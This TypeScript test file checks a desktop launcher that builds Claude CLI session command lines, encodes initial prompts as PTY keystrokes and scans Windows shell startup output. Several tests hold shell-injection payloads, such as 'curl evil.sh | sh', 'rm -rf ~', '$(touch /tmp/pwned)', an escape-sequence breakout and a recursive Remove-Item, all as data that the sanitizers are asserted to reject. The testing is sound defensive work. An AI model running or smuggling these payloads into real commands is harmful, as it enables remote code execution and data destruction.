import { test, expect, afterEach } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, join } from "node:path";

// All three modules are pure (no node-pty / electron), so they import under bun.
import {
  resolveLaunchConfig,
  DEFAULT_LAUNCH_COMMAND,
  DEFAULT_MODELS,
  localConfigPath,
  projectWorktreeInit,
  globalWorktreeInit,
  globalConfigDir
} from "../desktop/src/main/launch-config.ts";
import {
  buildSessionCommandLine,
  createMissingDirTracker,
  DECK_LEAD_PLUGIN_DIRNAME,
  DECK_PLUGIN_DIRNAME,
  deckLeadPluginDirFor,
  deckPluginDirFor,
  encodeInitialPromptKeystrokes,
  pluginDirsForTile,
  quotePromptArg,
  sanitizeFlagValue,
  shouldInjectPrompt
} from "../desktop/src/main/session-command.ts";
import * as shellCommand from "../desktop/src/main/shell-command.ts";
import {
  JOB_STARTUP_SCAN_WINDOW_MS,
  JobStartupStatus,
  MAX_ESCAPE_SEQUENCE_CODE_UNITS,
  scanJobStartup
} from "../desktop/src/main/pty-startup-status.ts";

const { buildShellInvocation, buildSpawnPlan } = shellCommand;

const tmpDirs: string[] = [];
function tmpProject(): string {
  const d = mkdtempSync(join(tmpdir(), "launch-test-"));
  tmpDirs.push(d);
  return d;
}
afterEach(() => {
  for (const d of tmpDirs.splice(0)) {
    try {
      rmSync(d, { recursive: true, force: true });
    } catch {
      // best-effort
    }
  }
});

function writeLocalConfig(projectDir: string, obj: unknown): void {
  const file = localConfigPath(projectDir);
  mkdirSync(join(projectDir, ".claude", "claude-peers"), { recursive: true });
  writeFileSync(file, typeof obj === "string" ? obj : JSON.stringify(obj), "utf-8");
}

// Point the global config at an (empty) temp dir so the developer's real global
// config can't leak into the assertions.
function emptyGlobalEnv(): NodeJS.ProcessEnv {
  const g = tmpProject();
  return { APPDATA: g, XDG_CONFIG_HOME: g } as NodeJS.ProcessEnv;
}

// ----- launch-config -----

test("defaults when no config files exist", () => {
  const cfg = resolveLaunchConfig(tmpProject(), emptyGlobalEnv());
  expect(cfg.launchCommand).toBe(DEFAULT_LAUNCH_COMMAND);
  expect(cfg.presets).toEqual([]);
});

test("project-local config overrides the default", () => {
  const proj = tmpProject();
  writeLocalConfig(proj, {
    launchCommand: "claude custom",
    presets: [{ label: "Reviewer", args: "--agent reviewer" }]
  });
  const cfg = resolveLaunchConfig(proj, emptyGlobalEnv());
  expect(cfg.launchCommand).toBe("claude custom");
  expect(cfg.presets).toHaveLength(1);
  expect(cfg.presets[0]).toEqual({ label: "Reviewer", args: "--agent reviewer" });
});

test("project-local wins over global", () => {
  const g = tmpProject();
  mkdirSync(join(g, "claude-peers-desk"), { recursive: true });
  writeFileSync(
    join(g, "claude-peers-desk", "config.json"),
    JSON.stringify({ launchCommand: "global-cmd" }),
    "utf-8"
  );
  const proj = tmpProject();
  writeLocalConfig(proj, { launchCommand: "local-cmd" });
  const env = { APPDATA: g, XDG_CONFIG_HOME: g } as NodeJS.ProcessEnv;
  expect(resolveLaunchConfig(proj, env).launchCommand).toBe("local-cmd");
});

test("malformed JSON is ignored (falls back to default)", () => {
  const proj = tmpProject();
  writeLocalConfig(proj, "{ this is not json ");
  expect(resolveLaunchConfig(proj, emptyGlobalEnv()).launchCommand).toBe(DEFAULT_LAUNCH_COMMAND);
});

test("models default to DEFAULT_MODELS, a local non-empty list overrides", () => {
  const proj = tmpProject();
  // No file -> built-in default model list.
  expect(resolveLaunchConfig(proj, emptyGlobalEnv()).models).toEqual(DEFAULT_MODELS);
  // A local list (with one malformed entry) overrides, keeping only valid models.
  writeLocalConfig(proj, {
    models: [{ id: "opus-x", label: "Opus X" }, { label: "no id" }, { id: "", label: "blank" }]
  });
  expect(resolveLaunchConfig(proj, emptyGlobalEnv()).models).toEqual([{ id: "opus-x", label: "Opus X" }]);
});

test("an empty local models list falls back to the default (not blank)", () => {
  const proj = tmpProject();
  writeLocalConfig(proj, { models: [] });
  expect(resolveLaunchConfig(proj, emptyGlobalEnv()).models).toEqual(DEFAULT_MODELS);
});

test("invalid presets are filtered out", () => {
  const proj = tmpProject();
  writeLocalConfig(proj, {
    presets: [{ label: "ok", args: "" }, { label: 42 }, { nope: true }]
  });
  const cfg = resolveLaunchConfig(proj, emptyGlobalEnv());
  expect(cfg.presets).toEqual([{ label: "ok", args: "" }]);
});

// ----- session-command -----

test("fresh launch appends --session-id then args", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-new",
    args: "--agent reviewer",
    mode: "fresh"
  });
  expect(line).toBe("claude run --session-id \"id-new\" --agent reviewer");
});

test("fresh launch without args", () => {
  const line = buildSessionCommandLine({ baseCommand: "claude run", sessionId: "id-1", mode: "fresh" });
  expect(line).toBe("claude run --session-id \"id-1\"");
});

test("resume forks prev into new id and never re-passes args/agent/model", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-new",
    prevSessionId: "id-old",
    args: "--agent reviewer --model opus",
    mode: "resume"
  });
  expect(line).toBe("claude run --resume \"id-old\" --fork-session --session-id \"id-new\"");
  expect(line).not.toContain("--agent");
  expect(line).not.toContain("--model");
});

test("resume without a prevSessionId degrades to a fresh launch", () => {
  const line = buildSessionCommandLine({ baseCommand: "claude run", sessionId: "id-1", mode: "resume" });
  expect(line).toBe("claude run --session-id \"id-1\"");
});

test("fresh launch appends --effort last when an effort level is set", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-1",
    args: "--agent reviewer",
    effort: "high",
    mode: "fresh"
  });
  // Quoted since card 6c380073 (second audit round): same discipline as
  // --agent/--model, see effortFlag's own doc.
  expect(line).toBe("claude run --session-id \"id-1\" --agent reviewer --effort \"high\"");
});

test("resume re-passes --effort (not auto-restored) after the fork", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-new",
    prevSessionId: "id-old",
    effort: "xhigh",
    mode: "resume"
  });
  expect(line).toBe("claude run --resume \"id-old\" --fork-session --session-id \"id-new\" --effort \"xhigh\"");
});

test("an empty/whitespace effort never emits the flag (Auto position)", () => {
  const fresh = buildSessionCommandLine({ baseCommand: "claude run", sessionId: "id-1", effort: "  ", mode: "fresh" });
  expect(fresh).toBe("claude run --session-id \"id-1\"");
  const resume = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-new",
    prevSessionId: "id-old",
    effort: "",
    mode: "resume"
  });
  expect(resume).toBe("claude run --resume \"id-old\" --fork-session --session-id \"id-new\"");
});

// Card 6c380073, second audit round: `effort` reached the login-shell command
// line with NO allow-list and NO quotes, while `agent`/`model` in this SAME
// file went through sanitizeFlagValue AND were double-quoted -- two
// disciplines in one file, and the exception was the bug. It was reachable by
// a deck-control caller restricted to three tools: parseEntry only trims
// `effort`, the restricted-caller guard tests only `entry.args`, and
// sessionsHaveShellFields looks only at command/args, so nothing on that path
// ever inspected this field. The documented enum
// ('low'|'medium'|'high'|'xhigh'|'max') lives ONLY in deck-control-mcp.ts's
// DECLARATIVE JSON schema (its tools/call forwards arguments verbatim) and in
// two renderer pickers -- it was a barrier on no path at all.

test("a hostile effort value never reaches the shell (sanitized + quoted, card 6c380073)", () => {
  // Every payload here is one sanitizeFlagValue already rejects for
  // agent/model; effort must now be held to the exact same rule.
  for (const hostile of [
    "low; touch /tmp/pwned",
    "low$(id)",
    "low`id`",
    "low && curl evil.sh | sh",
    'low" ; echo hi #'
  ]) {
    const fresh = buildSessionCommandLine({
      baseCommand: "claude run",
      sessionId: "id-1",
      effort: hostile,
      mode: "fresh"
    });
    // Rejected outright: no flag at all rather than a half-sanitized one.
    expect(fresh).toBe('claude run --session-id "id-1"');
    const resume = buildSessionCommandLine({
      baseCommand: "claude run",
      sessionId: "id-new",
      prevSessionId: "id-old",
      effort: hostile,
      mode: "resume"
    });
    expect(resume).toBe('claude run --resume "id-old" --fork-session --session-id "id-new"');
  }
});

test("a legitimate effort still rides the line, now double-quoted like --agent/--model", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-1",
    effort: "xhigh",
    mode: "fresh"
  });
  expect(line).toBe('claude run --session-id "id-1" --effort "xhigh"');
});

test("fresh launch inserts every --plugin-dir right after the base command", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-1",
    args: "--agent reviewer",
    pluginDirs: ["C:/res/deck-plugin", "C:/res/deck-lead-plugin"],
    effort: "high",
    mode: "fresh"
  });
  expect(line).toBe(
    'claude run --plugin-dir "C:/res/deck-plugin" --plugin-dir "C:/res/deck-lead-plugin" --session-id "id-1" --agent reviewer --effort "high"'
  );
});

test("resume inserts every --plugin-dir before --resume", () => {
  const line = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-new",
    prevSessionId: "id-old",
    pluginDirs: ["/opt/deck-plugin", "/opt/deck-lead-plugin"],
    mode: "resume"
  });
  expect(line).toBe(
    'claude run --plugin-dir "/opt/deck-plugin" --plugin-dir "/opt/deck-lead-plugin" --resume "id-old" --fork-session --session-id "id-new"'
  );
});

test("empty plugin directories never emit a flag", () => {
  const fresh = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-1",
    pluginDirs: ["  ", "C:/res/deck-plugin", ""],
    mode: "fresh"
  });
  expect(fresh).toBe('claude run --plugin-dir "C:/res/deck-plugin" --session-id "id-1"');
  const none = buildSessionCommandLine({ baseCommand: "claude run", sessionId: "id-1", mode: "fresh" });
  expect(none).toBe("claude run --session-id \"id-1\"");
});

test("a sandboxed deck-lead tile omits the unprojected role plugin", () => {
  let rolePluginDirRead = 0;
  const selected = pluginDirsForTile(
    "C:/res/deck-plugin",
    () => {
      rolePluginDirRead += 1;
      return "C:/res/deck-lead-plugin";
    },
    true,
    true
  );
  expect(selected).toEqual({ pluginDirs: ["C:/res/deck-plugin"], rolePluginOmitted: true });
  expect(rolePluginDirRead).toBe(0);
});

test("a host deck-lead tile adds the role plugin after the general plugin", () => {
  const selected = pluginDirsForTile(
    "C:/res/deck-plugin",
    () => "C:/res/deck-lead-plugin",
    true,
    false
  );
  expect(selected).toEqual({
    pluginDirs: ["C:/res/deck-plugin", "C:/res/deck-lead-plugin"],
    rolePluginOmitted: false
  });
});

// Card a79c7696 volet 1 review: pins the third corner of the deck-plugin
// invariant the reviewer measured as unpinned (basename of what
// getDeckPluginDir resolves on the HOST vs. SANDBOX_DECK_PLUGIN_NAME, the
// literal driving the container-side copy/clean/chown). deckPluginDirFor is
// the pure decision index.ts's getDeckPluginDir now delegates to, so this
// runs the SAME resolution index.ts uses -- not a re-statement of it.
test("embedded plugin resolvers use their own directory names in packaged and dev builds", () => {
  const plugins = [
    [deckPluginDirFor, DECK_PLUGIN_DIRNAME],
    [deckLeadPluginDirFor, DECK_LEAD_PLUGIN_DIRNAME]
  ] as const;
  for (const [resolve, dirname] of plugins) {
    const packaged = resolve(true, "C:/res", "C:/repo");
    const dev = resolve(false, "C:/res", "C:/repo");
    expect(basename(packaged)).toBe(dirname);
    expect(basename(dev)).toBe(dirname);
    expect(packaged.startsWith("C:/res") || packaged.startsWith("C:\\res")).toBe(true);
    expect(dev.startsWith("C:/repo") || dev.startsWith("C:\\repo")).toBe(true);
  }
});

// ----- supervisor flags (PLAN C5/C8): re-passed on fresh AND resume -----

test("--mcp-config and --append-system-prompt-file are emitted on both modes", () => {
  const fresh = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-1",
    mcpConfig: "/state/supervisor-mcp.json",
    appendSystemPromptFile: "/state/supervisor-system-prompt.md",
    mode: "fresh"
  });
  expect(fresh).toBe(
    'claude run --mcp-config "/state/supervisor-mcp.json" --append-system-prompt-file "/state/supervisor-system-prompt.md" --session-id "id-1"'
  );

  const resume = buildSessionCommandLine({
    baseCommand: "claude run",
    sessionId: "id-new",
    prevSessionId: "id-old",
    mcpConfig: "/state/supervisor-mcp.json",
    appendSystemPromptFile: "/state/supervisor-system-prompt.md",
    mode: "resume"
  });
  expect(resume).toContain('--mcp-config "/state/supervisor-mcp.json"');
  expect(resume).toContain('--append-system-prompt-file "/state/supervisor-system-prompt.md"');
  expect(resume).toContain("--resume \"id-old\" --fork-session");
});

test("--settings is emitted on both modes when set, absent when unset", () => {
  const fresh = buildSessionCommandLine({
    baseCommand: "claude",
    sessionId: "id-1",
    settingsFile: "/state/deck-statusline-abc.json",
    mode: "fresh"
  });
  expect(fresh, "fresh line carries the statusLine settings").toBe(
    'claude --settings "/state/deck-statusline-abc.json" --session-id "id-1"'
  );
  const resume = buildSessionCommandLine({
    baseCommand: "claude",
    sessionId: "id-new",
    prevSessionId: "id-old",
    settingsFile: "/state/deck-statusline-abc.json",
    mode: "resume"
  });
  expect(resume, "resume line re-passes the statusLine settings (not restored by --fork-session)").toContain(
    '--settings "/state/deck-statusline-abc.json"'
  );
  for (const settingsFile of [undefined, "", "   "]) {
    for (const mode of ["fresh", "resume"] as const) {
      const line = buildSessionCommandLine({
        baseCommand: "claude",
        sessionId: "id-new",
        prevSessionId: "id-old",
        settingsFile,
        mode
      });
      expect(line, `no --settings flag on ${mode} for ${JSON.stringify(settingsFile)}`).not.toContain("--settings");
    }
  }
});

// ----- initial prompt (PLAN C2), quoting helper still used by the headless
// antigravity adapter (model-adapters.ts) -----

test("posix prompt quoting is inert: apostrophes, $, backticks, newlines", () => {
  expect(quotePromptArg("l'item #12: fix `foo` for $USER\nthen report", "linux")).toBe(
    "'l'\\''item #12: fix `foo` for $USER\nthen report'"
  );
});

test("win32 prompt quoting doubles embedded single quotes (PowerShell)", () => {
  expect(quotePromptArg("l'item '12'", "win32")).toBe("'l''item ''12'''");
});

// The initial prompt is injected as PTY keystrokes once the tile's startup-ack
// fires, not passed via argv; encodeInitialPromptKeystrokes is the pure encoder
// for that path.

test("wraps the prompt in bracketed-paste marks with a trailing submit \\r, embedded newlines and quotes literal", () => {
  const prompt = 'Read "PLAN-v0.4.md" and start C2\nUse l\'item #12 for context.';
  expect(encodeInitialPromptKeystrokes(prompt)).toBe(`\x1b[200~${prompt}\x1b[201~\r`);
});

test("strips every ESC byte, including one shaped like the bracketed-paste closing marker", () => {
  // A prompt (possibly template-sourced, hostile input #1) that tries to
  // break out of the paste early with its own closing marker plus a trailing
  // fake command must not survive as a literal ESC sequence.
  const hostile = "before\x1b[201~rm -rf /\x1b[31mafter";
  expect(encodeInitialPromptKeystrokes(hostile)).toBe(
    "\x1b[200~before[201~rm -rf /[31mafter\x1b[201~\r"
  );
});

test("preserves accented and non-Latin1 characters unmangled (no ConPTY-specific corruption at the JS-string level)", () => {
  const prompt = "Lis d'abord le résumé\nContinue en 日本語 si besoin, then report.";
  expect(encodeInitialPromptKeystrokes(prompt)).toBe(`\x1b[200~${prompt}\x1b[201~\r`);
});

test("normalizes CRLF and lone CR to LF (a raw CR can submit early on a TUI that reads it as Enter, same failure class bracketed paste protects \\n from)", () => {
  const prompt = "line one\r\nline two\rline three";
  expect(encodeInitialPromptKeystrokes(prompt)).toBe(
    "\x1b[200~line one\nline two\nline three\x1b[201~\r"
  );
});

// shouldInjectPrompt is the pure predicate session-service.ts's startPty
// calls to gate `pendingPrompt` (150eb188 review: session-service imports
// node-pty and can't be constructed under bun, so the once-per-spawn
// invariant has to be testable here instead).

test("resume never re-plays the prompt", () => {
  expect(shouldInjectPrompt("resume", "should not appear")).toBe(false);
});

test("an empty/whitespace prompt on a fresh spawn never emits an injection", () => {
  expect(shouldInjectPrompt("fresh", undefined)).toBe(false);
  expect(shouldInjectPrompt("fresh", "")).toBe(false);
  expect(shouldInjectPrompt("fresh", "   \n\t ")).toBe(false);
});

test("a fresh spawn with a non-empty prompt injects", () => {
  expect(shouldInjectPrompt("fresh", "hello")).toBe(true);
});

// ----- B5: worktreeInit accessors (gated at startup in index.ts) -----

test("projectWorktreeInit reads the project-local hook, null when absent", () => {
  const proj = tmpProject();
  expect(projectWorktreeInit(proj)).toBeNull();
  writeLocalConfig(proj, { launchCommand: "claude", worktreeInit: "bun install" });
  expect(projectWorktreeInit(proj)).toBe("bun install");
});

test("globalWorktreeInit reads the global hook, undefined when absent", () => {
  const g = tmpProject();
  const env = { APPDATA: g, XDG_CONFIG_HOME: g } as NodeJS.ProcessEnv;
  expect(globalWorktreeInit(env)).toBeUndefined();
  const dir = globalConfigDir(env);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "config.json"), JSON.stringify({ worktreeInit: "npm ci" }), "utf-8");
  expect(globalWorktreeInit(env)).toBe("npm ci");
});

// ----- B6: agent/model flag sanitization -----

test("sanitizeFlagValue passes real agent/model ids, including the 1M form", () => {
  expect(sanitizeFlagValue("general-purpose")).toBe("general-purpose");
  expect(sanitizeFlagValue("claude-opus-4-8")).toBe("claude-opus-4-8");
  expect(sanitizeFlagValue("claude-opus-4-8[1m]")).toBe("claude-opus-4-8[1m]");
  expect(sanitizeFlagValue("openai:gpt-4o")).toBe("openai:gpt-4o");
  expect(sanitizeFlagValue("openrouter/anthropic/claude")).toBe("openrouter/anthropic/claude");
  // Bridged (clodex) ids: three colon-separated segments plus a dotted
  // version, the exact string the wrapper's --model expects.
  expect(sanitizeFlagValue("clodex:openai-oauth:gpt-5.6-sol")).toBe("clodex:openai-oauth:gpt-5.6-sol");
  expect(sanitizeFlagValue("  reviewer  ")).toBe("reviewer");
});

test("sanitizeFlagValue rejects shell-injection payloads (returns '')", () => {
  expect(sanitizeFlagValue('x$(touch /tmp/pwned)')).toBe("");
  expect(sanitizeFlagValue("x; rm -rf ~")).toBe("");
  expect(sanitizeFlagValue("x`id`")).toBe("");
  expect(sanitizeFlagValue('x" ; echo hi #')).toBe("");
  expect(sanitizeFlagValue("x && curl evil|sh")).toBe("");
  expect(sanitizeFlagValue("")).toBe("");
});

// ----- shell-command -----

test("non-interactive unix uses a login shell, no -i, no marker", () => {
  const inv = buildShellInvocation({ command: "claude x", shell: "/bin/bash", interactive: false }, "linux");
  expect(inv.file).toBe("/bin/bash");
  expect(inv.args).toEqual(["-l", "-c", "claude x"]);
  expect(inv.args).not.toContain("-i");
  expect(inv.marker).toBeNull();
});

test("interactive unix adds -i and prepends a start marker", () => {
  const inv = buildShellInvocation({ command: "claude x", shell: "/bin/zsh", interactive: true }, "linux");
  expect(inv.args.slice(0, 3)).toEqual(["-l", "-i", "-c"]);
  expect(inv.marker).toBeTruthy();
  expect(inv.args[3]).toContain(inv.marker as string);
  expect(inv.args[3]).toContain("claude x");
});

test("windows non-interactive uses -NoProfile, interactive loads the profile", () => {
  const off = buildShellInvocation({ command: "claude x", shell: "", interactive: false }, "win32");
  expect(off.file).toBe("powershell.exe");
  expect(off.args).toEqual(["-NoLogo", "-NoProfile", "-Command", "claude x"]);
  expect(off.marker).toBeNull();

  const on = buildShellInvocation({ command: "claude x", shell: "", interactive: true }, "win32");
  expect(on.args).not.toContain("-NoProfile");
  expect(on.marker).toBeTruthy();
  expect(on.args[on.args.length - 1]).toContain(on.marker as string);
});

test("windows killTreeOnClose evaluates the Job Object preamble from the environment", () => {
  const invocation = buildShellInvocation({ command: "claude x", shell: "", interactive: false, killTreeOnClose: true }, "win32");
  const command = invocation.args.at(-1)!;

  expect(shellCommand.JOB_PREAMBLE_PS).toContain("Add-Type");
  expect(command).toContain("[ScriptBlock]::Create($env:KORY_JOB_PS)");
  expect(command).toContain("$global:KoryJobOk");
  expect(command).toEndWith("claude x");
  expect(command).not.toContain("Add-Type");
  expect(command).not.toContain(shellCommand.JOB_PREAMBLE_PS);
});

test("windows interactive killTreeOnClose keeps the output marker before the preamble", () => {
  const invocation = buildShellInvocation({ command: "claude x", shell: "", interactive: true, killTreeOnClose: true }, "win32");
  const command = invocation.args.at(-1)!;

  expect(invocation.marker).toBeTruthy();
  expect(command.indexOf(invocation.marker!)).toBeLessThan(command.indexOf("[ScriptBlock]::Create($env:KORY_JOB_PS)"));
  expect(command).toEndWith("claude x");
});

test("killTreeOnClose leaves unix shell invocation unchanged", () => {
  const invocation = buildShellInvocation({ command: "claude x", shell: "/bin/bash", interactive: false, killTreeOnClose: true }, "linux");

  expect(invocation.args).toEqual(["-l", "-c", "claude x"]);
});

const JOB_MARKER = "kory-job: tree kill disabled";
const CONPTY_SUCCESS =
  "\x1b[?9001h\x1b[?1004h\x1b[?25l\x1b[2J\x1b[m\x1b[HPS C:\\work> " +
  "\x1b]0;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\x07\x1b[?25h\r\n";
const CONPTY_FAILURE = `AVERTISSEMENT : ${JOB_MARKER}: job not entered\x1b[K\x1b[m\r\n`;
const TITLE_WITH_MARKER_BEL = `\x1b]0;${JOB_MARKER}\x07`;
const TITLE_WITH_MARKER_ST = `\x1b]0;${JOB_MARKER}\x1b\\`;

function countReports(chunks: string[], now = 1_000): number {
  const status = new JobStartupStatus(1_000);
  return chunks.filter((chunk) => status.consume(chunk, now).reportFailure).length;
}

function everyTwoChunkSplit(output: string): string[][] {
  return Array.from({ length: output.length + 1 }, (_, at) => [output.slice(0, at), output.slice(at)]);
}

test("Job startup status never reports the real ConPTY success output, at any chunk split", () => {
  for (const chunks of everyTwoChunkSplit(CONPTY_SUCCESS)) {
    expect(countReports(chunks), `split ${JSON.stringify(chunks)}`).toBe(0);
  }
});

test("Job startup status reports the real ConPTY failure line exactly once, at any chunk split", () => {
  for (const chunks of everyTwoChunkSplit(CONPTY_SUCCESS + CONPTY_FAILURE)) {
    expect(countReports(chunks), `split ${JSON.stringify(chunks)}`).toBe(1);
  }
});

test("Job startup status ignores the marker inside an OSC title terminated by BEL or ST, at any chunk split", () => {
  for (const title of [TITLE_WITH_MARKER_BEL, TITLE_WITH_MARKER_ST]) {
    for (const chunks of everyTwoChunkSplit(CONPTY_SUCCESS + title + CONPTY_SUCCESS)) {
      expect(countReports(chunks), `split ${JSON.stringify(chunks)}`).toBe(0);
    }
  }
});

test("Job startup status reports the visible marker after an OSC title holding it, at any chunk split", () => {
  for (const title of [TITLE_WITH_MARKER_BEL, TITLE_WITH_MARKER_ST]) {
    for (const chunks of everyTwoChunkSplit(title + CONPTY_FAILURE)) {
      expect(countReports(chunks), `split ${JSON.stringify(chunks)}`).toBe(1);
    }
  }
});

test.each([
  ["OSC split at ESC | ]", ["PS> \x1b", `]0;${JOB_MARKER}\x07`], 0],
  ["OSC split right after its introducer", ["\x1b]0;", `${JOB_MARKER}\x07`], 0],
  ["OSC split before BEL", [`\x1b]0;${JOB_MARKER}`, "\x07\r\n"], 0],
  ["OSC split at ESC | \\ of ST", [`\x1b]0;${JOB_MARKER}\x1b`, "\\\r\n"], 0],
  ["OSC split at ESC | \\ of ST, failure line after", ["\x1b]0;title\x1b", `\\${CONPTY_FAILURE}`], 1],
  ["CSI split at ESC | [ inside the marker", ["kory-job: tree \x1b", "[Kkill disabled\r\n"], 1],
  ["CSI split after the introducer inside the marker", ["kory-job: tree \x1b[", "Kkill disabled\r\n"], 1],
  ["CSI split inside the parameter inside the marker", ["kory-job: tree \x1b[1", "0Ckill disabled\r\n"], 1],
  ["CSI split after the final byte inside the marker", ["kory-job: tree \x1b[10C", "kill disabled\r\n"], 1]
] as const)("Job startup status keeps escape state across chunks: %s", (_name, chunks, reports) => {
  expect(countReports([...chunks])).toBe(reports);
});

test("Job startup status abandons an unterminated OSC after its code-unit cap and reports what follows", () => {
  const runaway = "\x1b]0;" + "x".repeat(MAX_ESCAPE_SEQUENCE_CODE_UNITS);
  expect(countReports([runaway, CONPTY_FAILURE]), "an OSC never terminated must not hide the rest of startup").toBe(1);

  const longTitle = "\x1b]0;" + "x".repeat(MAX_ESCAPE_SEQUENCE_CODE_UNITS - 100) + JOB_MARKER + "\x07";
  expect(countReports([longTitle]), "an OSC within the cap stays hidden").toBe(0);
});

test("Job startup status reports a ConPTY repaint only once, then stays done", () => {
  const status = new JobStartupStatus(1_000);

  expect(status.consume(CONPTY_FAILURE, 1_000)).toEqual({ reportFailure: true, done: true });
  expect(status.consume(CONPTY_FAILURE, 15_000)).toEqual({ reportFailure: false, done: true });
});

test("Job startup status reports the marker only strictly inside its startup window", () => {
  const startedAt = 1_000;
  const lastInside = startedAt + JOB_STARTUP_SCAN_WINDOW_MS - 1;

  expect(new JobStartupStatus(startedAt).consume(CONPTY_FAILURE, lastInside), "1 ms before the window ends").toEqual({
    reportFailure: true,
    done: true
  });
  for (const now of [startedAt + JOB_STARTUP_SCAN_WINDOW_MS, startedAt + JOB_STARTUP_SCAN_WINDOW_MS + 1, startedAt + 60_000]) {
    expect(new JobStartupStatus(startedAt).consume(CONPTY_FAILURE, now), `at +${now - startedAt} ms`).toEqual({
      reportFailure: false,
      done: true
    });
  }
});

test("Job startup scan drops the status at its terminal state and reads no clock afterwards", () => {
  let clockReads = 0;
  const clock = () => {
    clockReads++;
    return 1_000;
  };

  const live = scanJobStartup(new JobStartupStatus(1_000), CONPTY_SUCCESS, clock);
  expect(live.status, "a live status survives a chunk without the marker").not.toBeNull();
  expect(clockReads).toBe(1);

  const reported = scanJobStartup(live.status, CONPTY_FAILURE, clock);
  expect(reported).toEqual({ status: null, reportFailure: true });

  const expired = scanJobStartup(new JobStartupStatus(1_000), CONPTY_SUCCESS, () => 1_000 + JOB_STARTUP_SCAN_WINDOW_MS);
  expect(expired).toEqual({ status: null, reportFailure: false });

  clockReads = 0;
  expect(scanJobStartup(null, CONPTY_FAILURE, clock)).toEqual({ status: null, reportFailure: false });
  expect(clockReads, "a dropped status costs no clock read per chunk").toBe(0);
});

test("spawn plan on win32 forces the Job Object preamble over a hostile extraEnv", () => {
  const { invocation, env } = buildSpawnPlan(
    { command: "claude x", shell: "", interactive: false },
    { KORY_JOB_PS: "Remove-Item C:\\ -Recurse", OTHER: "kept" },
    "win32"
  );

  expect(env.KORY_JOB_PS, "the preamble env must be ours, not the caller's").toBe(shellCommand.JOB_PREAMBLE_PS);
  expect(env.OTHER).toBe("kept");
  expect(invocation.args.at(-1), "killTreeOnClose must be forced on every tile").toContain(
    "[ScriptBlock]::Create($env:KORY_JOB_PS)"
  );
  expect(invocation.args.at(-1)).toEndWith("claude x");
});

test("spawn plan off win32 neither sets KORY_JOB_PS nor changes the shell command", () => {
  const { invocation, env } = buildSpawnPlan({ command: "claude x", shell: "/bin/bash", interactive: false }, {}, "linux");

  expect(env.KORY_JOB_PS, "KORY_JOB_PS is only ours on win32").toBe(process.env.KORY_JOB_PS);
  expect(invocation.args).toEqual(["-l", "-c", "claude x"]);
});

test("windows non-interactive Job Object command emits no startup sentinel", () => {
  const invocation = buildShellInvocation({ command: "claude x", shell: "", interactive: false, killTreeOnClose: true }, "win32");
  const command = invocation.args.at(-1)!;

  expect(invocation.marker).toBeNull();
  expect(command).not.toContain("KORY_JOB_STARTUP");
  expect(command).not.toContain("Write-Output");
});

test("createMissingDirTracker reports once when the dir is missing from the very first check", () => {
  const tracker = createMissingDirTracker();
  expect(tracker.check(false)).toBe(true);
  expect(tracker.check(false)).toBe(false);
  expect(tracker.check(false)).toBe(false);
});

test("createMissingDirTracker reports on a present->absent transition mid-run, not just at boot", () => {
  const tracker = createMissingDirTracker();
  expect(tracker.check(true)).toBe(false);
  expect(tracker.check(true)).toBe(false);
  expect(tracker.check(false)).toBe(true);
  expect(tracker.check(false)).toBe(false);
});

test("createMissingDirTracker re-arms: a return to present clears the report, a later disappearance reports again", () => {
  const tracker = createMissingDirTracker();
  expect(tracker.check(false)).toBe(true);
  expect(tracker.check(true)).toBe(false);
  expect(tracker.check(true)).toBe(false);
  expect(tracker.check(false)).toBe(true);
});
